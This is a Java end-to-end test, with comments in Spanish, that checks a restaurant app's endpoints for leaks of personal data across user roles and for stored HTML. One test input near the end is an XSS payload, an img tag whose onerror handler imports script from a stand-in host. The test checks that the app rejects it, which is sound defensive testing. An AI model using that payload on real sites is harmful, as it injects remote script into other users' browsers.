package com.menujpa.e2e;

import com.fasterxml.jackson.databind.JsonNode;
import org.assertj.core.api.SoftAssertions;
import org.junit.jupiter.api.Test;

import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;

// Exposicion de datos entre usuarios, probada por HTTP con un usuario real de cada rol:
// - un visitante anonimo no puede leer los datos personales del gerente a traves de GET /menus;
// - un cliente no puede leer los pedidos (ni los datos personales) de otro cliente;
// - un campo libre que el panel pinta con innerHTML (dificultad de receta) no acepta HTML.
// Se usan aserciones blandas para que una corrida muestre todos los huecos juntos.
//
// Presupuesto de rate limit: 5 llamadas a /auth/* (limite: 5 por minuto por IP).
class AccesoDatosIT extends E2EBase {

    private static final String CEDULA_GERENTE = "20111222";
    private static final String CEDULA_CARLA = "30111222";
    private static final String TELEFONO_CARLA = "1155550001";

    @Test
    void datosPersonales_soloLosVeQuienCorresponde() {
        crearGerenteInicial("gerente.e2e", "Gerente#2026");
        jdbc.update("UPDATE gerente SET cedula = ?, telefono = ?, correo = ? WHERE usuario = ?",
            CEDULA_GERENTE, "1144440000", "gerencia@example.com", "gerente.e2e");
        long idGerente = jdbc.queryForObject("SELECT id FROM gerente WHERE usuario = ?", Long.class, "gerente.e2e");

        http.seccion("El gerente arma el escenario por la API");
        String tokenGerente = login("gerente.e2e", "Gerente#2026", "GERENTE");
        crearPersonal(tokenGerente, "/api/v1/meseros", "Ana", "mesero.ana", "MeseroAna#2026");
        crearPersonal(tokenGerente, "/api/v1/chefs", "Elena", "chef.elena", "ChefElena#2026");
        var menu = http.post("/api/v1/menus", tokenGerente, Map.of(
            "nombre", "Menu del dia", "gerente", Map.of("id", idGerente)));
        assertThat(menu.status()).as("alta de menu").isEqualTo(200);
        var despensa = http.post("/api/v1/despensas", tokenGerente, Map.of("gerente", Map.of("id", idGerente)));
        assertThat(despensa.status()).as("alta de despensa").isEqualTo(200);
        var alimento = http.post("/api/v1/alimentos", tokenGerente, Map.of("nombre", "Milanesa", "precio", 8500.0));
        assertThat(alimento.status()).as("alta de alimento").isEqualTo(200);
        long milanesa = alimento.cuerpo().path("id").asLong();

        http.seccion("Dos clientas se registran solas");
        String tokenCarla = registrar("Carla", "cliente.carla", CEDULA_CARLA, TELEFONO_CARLA);
        String tokenDiana = registrar("Diana", "cliente.diana", "30999888", "1155550002");
        assertThat(tokenCarla).isNotBlank();

        http.seccion("Ana toma un pedido para Carla");
        String tokenAna = login("mesero.ana", "MeseroAna#2026", "MESERO");
        long carla = jdbc.queryForObject("SELECT id FROM cliente WHERE usuario = ?", Long.class, "cliente.carla");
        var tomado = http.post("/api/v1/pedidos/tomar", tokenAna, Map.of(
            "clienteIds", List.of(carla), "alimentoIds", List.of(milanesa)));
        assertThat(tomado.status()).as("pedido tomado").isEqualTo(201);
        long pedidoDeCarla = tomado.cuerpo().path("id").asLong();

        SoftAssertions soft = new SoftAssertions();

        http.seccion("Un visitante sin sesion lista los menus");
        var menusAnonimo = http.get("/api/v1/menus", null);
        soft.assertThat(menusAnonimo.status()).as("GET /menus anonimo").isEqualTo(200);
        soft.assertThat(textos(menusAnonimo.cuerpo(), "cedula"))
            .as("GET /menus anonimo expone la cedula del gerente").doesNotContain(CEDULA_GERENTE);
        soft.assertThat(textos(menusAnonimo.cuerpo(), "usuario"))
            .as("GET /menus anonimo expone el usuario de login del gerente").doesNotContain("gerente.e2e");
        soft.assertThat(textos(menusAnonimo.cuerpo(), "nombre"))
            .as("GET /menus sigue mostrando el nombre del gerente").contains("Gerencia");

        http.seccion("Un visitante sin sesion lista las despensas");
        var despensasAnonimo = http.get("/api/v1/despensas", null);
        soft.assertThat(despensasAnonimo.status()).as("GET /despensas anonimo").isEqualTo(200);
        soft.assertThat(textos(despensasAnonimo.cuerpo(), "cedula"))
            .as("GET /despensas anonimo expone la cedula del gerente").doesNotContain(CEDULA_GERENTE);
        soft.assertThat(textos(despensasAnonimo.cuerpo(), "apellido"))
            .as("GET /despensas sigue mostrando el apellido del gerente").contains("Inicial");

        http.seccion("Diana intenta ver los pedidos de Carla");
        var listadoDiana = http.get("/api/v1/pedidos", tokenDiana);
        soft.assertThat(listadoDiana.status()).as("GET /pedidos de Diana").isEqualTo(200);
        soft.assertThat(listadoDiana.cuerpo().size()).as("pedidos que ve Diana").isZero();
        soft.assertThat(textos(listadoDiana.cuerpo(), "cedula"))
            .as("Diana ve la cedula de Carla en GET /pedidos").doesNotContain(CEDULA_CARLA);
        soft.assertThat(textos(listadoDiana.cuerpo(), "telefono"))
            .as("Diana ve el telefono de Carla en GET /pedidos").doesNotContain(TELEFONO_CARLA);
        var pedidoAjeno = http.get("/api/v1/pedidos/" + pedidoDeCarla, tokenDiana);
        var pedidoInexistente = http.get("/api/v1/pedidos/999999", tokenDiana);
        soft.assertThat(pedidoAjeno.status()).as("Diana lee por id el pedido de Carla").isEqualTo(404);
        soft.assertThat(pedidoAjeno.cuerpo().path("error").asText().replace(String.valueOf(pedidoDeCarla), "N"))
            .as("el pedido ajeno se distingue de uno inexistente")
            .isEqualTo(pedidoInexistente.cuerpo().path("error").asText().replace("999999", "N"));

        http.seccion("Carla ve su propio pedido, sin datos personales de nadie");
        var pedidoPropio = http.get("/api/v1/pedidos/" + pedidoDeCarla, tokenCarla);
        soft.assertThat(pedidoPropio.status()).as("Carla lee su propio pedido").isEqualTo(200);
        soft.assertThat(textos(pedidoPropio.cuerpo(), "nombre")).as("nombres en el pedido").contains("Carla", "Ana");
        for (String campo : List.of("cedula", "telefono", "correo", "usuario", "salario")) {
            soft.assertThat(pedidoPropio.cuerpo().findValues(campo)).as("el pedido expone %s", campo).isEmpty();
        }
        var listadoCarla = http.get("/api/v1/pedidos", tokenCarla);
        soft.assertThat(listadoCarla.cuerpo().findValues("id").stream().map(JsonNode::asLong).toList())
            .as("Carla ve su pedido en el listado").contains(pedidoDeCarla);

        http.seccion("El mesero sigue viendo todos los pedidos");
        var listadoAna = http.get("/api/v1/pedidos", tokenAna);
        soft.assertThat(listadoAna.status()).as("GET /pedidos del mesero").isEqualTo(200);
        soft.assertThat(listadoAna.cuerpo().size()).as("pedidos que ve el mesero").isEqualTo(1);
        soft.assertThat(listadoAna.cuerpo().findValues("salario")).as("el listado expone el salario del mesero").isEmpty();

        http.seccion("La chef intenta guardar HTML en la dificultad de una receta");
        String tokenChef = login("chef.elena", "ChefElena#2026", "CHEF");
        var recetaConHtml = http.post("/api/v1/recetas", tokenChef, Map.of(
            "nombreReceta", "Flan", "dificultad", "<img src=x onerror=import('//evil.test')>"));
        soft.assertThat(recetaConHtml.status()).as("receta con HTML en dificultad").isEqualTo(400);
        soft.assertThat(jdbc.queryForObject("SELECT COUNT(*) FROM receta WHERE dificultad LIKE '%<%'", Long.class))
            .as("HTML guardado en receta.dificultad").isZero();
        var recetaValida = http.post("/api/v1/recetas", tokenChef, Map.of("nombreReceta", "Flan", "dificultad", "Fácil"));
        soft.assertThat(recetaValida.status()).as("receta con dificultad valida").isEqualTo(200);
        var recetaSinDificultad = http.post("/api/v1/recetas", tokenChef, Map.of("nombreReceta", "Budin"));
        soft.assertThat(recetaSinDificultad.status()).as("receta sin dificultad").isEqualTo(200);

        soft.assertAll();
    }

    private String login(String usuario, String contrasenia, String rolEsperado) {
        var res = http.post("/api/v1/auth/login", null, Map.of("usuario", usuario, "contrasenia", contrasenia));
        assertThat(res.status()).as("login de %s", usuario).isEqualTo(200);
        assertThat(res.cuerpo().path("rol").asText()).isEqualTo(rolEsperado);
        return res.cuerpo().path("token").asText();
    }

    private String registrar(String nombre, String usuario, String cedula, String telefono) {
        var res = http.post("/api/v1/auth/registrarse", null, Map.of(
            "nombre", nombre, "apellido", "Cliente", "cedula", cedula, "telefono", telefono,
            "correo", usuario + "@example.com", "usuario", usuario, "contrasenia", "Clienta#2026"));
        assertThat(res.status()).as("registro de %s", usuario).isEqualTo(201);
        return res.cuerpo().path("token").asText();
    }

    private void crearPersonal(String tokenGerente, String ruta, String nombre, String usuario, String contrasenia) {
        var res = http.post(ruta, tokenGerente, Map.of(
            "nombre", nombre, "apellido", "Staff", "usuario", usuario, "contrasenia", contrasenia));
        assertThat(res.status()).as("alta de %s", usuario).isEqualTo(200);
    }

    private static List<String> textos(JsonNode cuerpo, String campo) {
        return cuerpo == null ? List.of() : cuerpo.findValues(campo).stream().map(JsonNode::asText).toList();
    }
}
